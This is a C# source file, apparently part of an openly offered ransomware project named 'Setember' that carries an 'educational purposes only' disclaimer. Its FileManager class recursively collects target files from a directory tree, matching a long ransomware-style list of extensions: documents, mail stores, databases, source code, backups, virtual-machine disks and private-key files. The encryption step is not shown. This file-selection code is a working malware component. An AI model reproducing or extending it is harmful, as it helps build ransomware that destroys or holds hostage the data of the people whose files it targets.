// 
//   ____ __________ _____ __  __ ____ _____ ____  
//  / ___|___ /_   _|___ /|  \/  | __ )___ /|  _ \ 
//  \___ \ |_ \ | |   |_ \| |\/| |  _ \ |_ \| |_) |
//   ___) |__) || |  ___) | |  | | |_) |__) |  _ < 
//  |____/____/ |_| |____/|_|  |_|____/____/|_| \_\
//                                                 
//
// Copyright (c) 2023 Daniel Aspect
// 
// This file is part of the "Setember" project, licensed under The MIT License.
// 
// THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!

using System.Collections.Generic;
using System.IO;

namespace Setember;

public class FileManager
{
    public static HashSet<string> FilesPath = new HashSet<string>();

    private static readonly HashSet<string> fileFormat = new HashSet<string>()
    {
        ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX", ".PST", ".OST", ".MSG",
        ".EML", ".VSD", ".VSDX", ".TXT", ".CSV", ".RTF", ".WKS", ".WK1", ".PDF",
        ".DWG", ".ONETO", ".SNT", ".JPEG", ".JPG", ".DOCB", ".DOCM",".DOT", ".DOTM",
        ".DOTX", ".XLSM", ".XLSB", ".XLW", ".XLT", ".XLM", ".XLC", ".XLTX", ".XLTM",
        ".PPTM",".POT", ".PPS", ".PPSM", ".PPSX", ".PPAM", ".POTX",".POTM", ".EDB",
        ".HWP", ".602", ".SXI", ".STI", ".SLDX" , ".SLDM", ".VDI", ".VMDK", ".VMX",
        ".GPG", ".AES", ".ARC", ".PAQ", ".BZ2", ".TBK", ".BAK", ".TAR", ".TGZ", ".GZ",
        ".7Z", ".RAR", ".ZIP", ".BACKU" ,  ".ISO", ".VCD", ".BMP", ".PNG", ".GIF",
        ".RAW", ".CGM", ".TIF", ".TIFF", ".NEF", ".PSD", ".AI",  ".SVG", ".DJVU",
        ".M4U", ".M3U", ".MID", ".WMA", ".FLV", ".3G2", ".MKV", ".3GP", ".MP4",
        ".MOV", ".AVI", ".ASF", ".MPEG", ".VOB", ".MPG", ".WMV", ".FLA", ".SWF",
        ".WAV", ".MP3", ".SH", ".CLASS" , ".JAR", ".JAVA",".RB", ".ASP", ".PHP",
        ".JSP", ".BRD", ".SCH", ".DCH", ".DIP", ".PL", ".VB",  ".VBS", ".PS1", ".BAT",
        ".CMD", ".JS", ".ASM",  ".H", ".PAS", ".CPP", ".C", ".CS", ".SUO",  ".SLN",
        ".LDF", ".MDF", ".IBD", ".MYI", ".MYD", ".FRM", ".ODB", ".DBF", ".DB", ".MDB",
        ".ACCDB", ".SQL", ".SQLITEDB", ".SQLITE3", ".ASC", ".LAY6",  ".LAY", ".MML", ".SXM",
        ".OTG",".ODG", ".UOP", ".STD", ".SXD", ".OTP", ".ODP", ".WB2", ".SLK", ".DIF",
        ".STC", ".SXC", ".OTS", ".ODS", ".3DM", ".MAX", ".3DS", ".UOT", ".STW", ".SXW",
        ".OTT", ".ODT", ".PEM", ".P12", ".CSR", ".CRT", ".KEY", ".PFX", ".DER"
    };

    public async Task InitAsync(string path)
        => await Task.Run(() => GetFiles(path));


    protected void GetFiles(string path)
    {
        foreach (string actualPath in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
        {
            string[] filesFound = Directory.GetFiles(actualPath);
            foreach (string file in filesFound)
            {
                string extension = Path.GetExtension(file).ToUpper();
                if (fileFormat.Contains(extension) || extension == "")
                {
                    FilesPath.Add(Path.Combine(actualPath, file));
                }
            }
        }
    }
}
